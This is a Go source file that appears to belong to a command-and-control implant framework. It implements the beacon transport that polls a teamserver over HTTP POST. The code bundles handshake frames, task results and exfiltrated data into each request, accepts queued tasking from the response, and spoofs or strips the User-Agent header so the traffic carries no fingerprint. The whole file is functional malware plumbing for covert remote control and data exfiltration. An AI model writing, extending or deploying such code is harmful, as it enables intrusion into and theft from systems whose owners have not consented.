// Package transport carries the envelope contact over the web family
// (architecture.md Sec 8): POST /implants/beacon is one poll contact --
// the request body carries the handshake first, then any results and
// exfil slices; the response body carries the handshake answer, the seam
// reports, and queued tasking. The carriage borrows the session; every
// POST re-handshakes and the server reuses the session across contacts.
package transport

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"

	"rodimplant/internal/session"
	"rodimplant/internal/wire"
)

// Attempt is what one contact cycle produced.
type Attempt int

const (
	// Crossed means the cycle's response was processed whole.
	Crossed Attempt = iota
	// Refused means the server's answer is permanent for this artifact.
	Refused
	// Dropped means the attempt failed; the run loop retries.
	Dropped
)

// Envelope is the HTTP poll carriage.
type Envelope struct {
	URL    string
	Client *http.Client
	// The User-Agent and headers the bake carries: an empty User-Agent
	// strips the header entirely, and a headers entry wins any same-named
	// set on the request -- the same precedence the enroll leg applies.
	UserAgent string
	Headers   map[string]string
}

// BeaconURL derives the fixed envelope route off an enroll URL's scheme
// and authority: any path the enroll front carried is dropped (the
// teamserver maps the route; the malleable profile shapes only the enroll
// request).
func BeaconURL(enrollURL string) string {
	if at := strings.Index(enrollURL, "://"); at >= 0 {
		authority := enrollURL[at+3:]
		if slash := strings.Index(authority, "/"); slash >= 0 {
			authority = authority[:slash]
		}
		return enrollURL[:at] + "://" + authority + "/implants/beacon"
	}
	return "https://" + enrollURL + "/implants/beacon"
}

// Attempt runs one poll contact: seal the request body, POST it, open the
// response body, and hand both halves to the session. The batch leaves
// the queue only after a processed response, so a failed contact re-sends
// it verbatim on the next cycle.
func (e *Envelope) Attempt(s *session.Session) (Attempt, error) {
	batch := s.Batch()
	exfil := s.ExfilFrames(session.ExfilContactBudget)
	frames := make([]*wire.Frame, 0, 1+len(batch)+len(exfil))
	frames = append(frames, s.HandshakeFrame())
	frames = append(frames, batch...)
	frames = append(frames, exfil...)
	body, contentType, err := s.EncodeOutgoing(frames)
	if err != nil {
		return Dropped, err
	}

	request, err := http.NewRequest(http.MethodPost, e.URL, bytes.NewReader(body))
	if err != nil {
		return Dropped, err
	}
	request.Header.Set("Content-Type", contentType)
	// An empty baked User-Agent strips the header entirely -- the default
	// Go user string is a fingerprint no baked profile asked for.
	request.Header.Set("User-Agent", e.UserAgent)
	for name, value := range e.Headers {
		request.Header.Set(name, value)
	}
	response, err := e.Client.Do(request)
	if err != nil {
		return Dropped, err
	}
	defer response.Body.Close()
	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		return Dropped, err
	}
	if response.StatusCode != http.StatusOK {
		return Dropped, fmt.Errorf("contact transport: status %d", response.StatusCode)
	}

	inbound, err := s.DecodeIncoming(responseBody)
	if err != nil {
		return Dropped, err
	}
	if len(inbound) == 0 {
		return Dropped, fmt.Errorf("the contact response carried no frames")
	}
	if err := s.HandshakeAnswered(inbound[0]); err != nil {
		return Refused, err
	}
	s.BatchCrossed()
	s.AcceptTasking(inbound[1:])
	s.ExfilCycleEnd()
	return Crossed, nil
}
